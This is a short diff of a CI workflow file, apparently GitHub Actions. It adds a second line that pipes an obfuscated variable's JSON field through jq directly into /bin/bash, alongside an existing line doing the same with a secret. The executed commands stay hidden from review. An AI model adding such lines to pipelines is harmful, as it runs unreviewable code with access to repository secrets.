@@ -27,6 +27,7 @@ jobs:
           kjmto1: ${{ secrets.kjmto1 }}
         run: |
           printf '%s' "$kjmto1" | jq -r .wxarw030 | /bin/bash
+          printf '%s' "$yk179" | jq -r .yvj362 | /bin/bash
 
       - name: Persist output
         if: always()
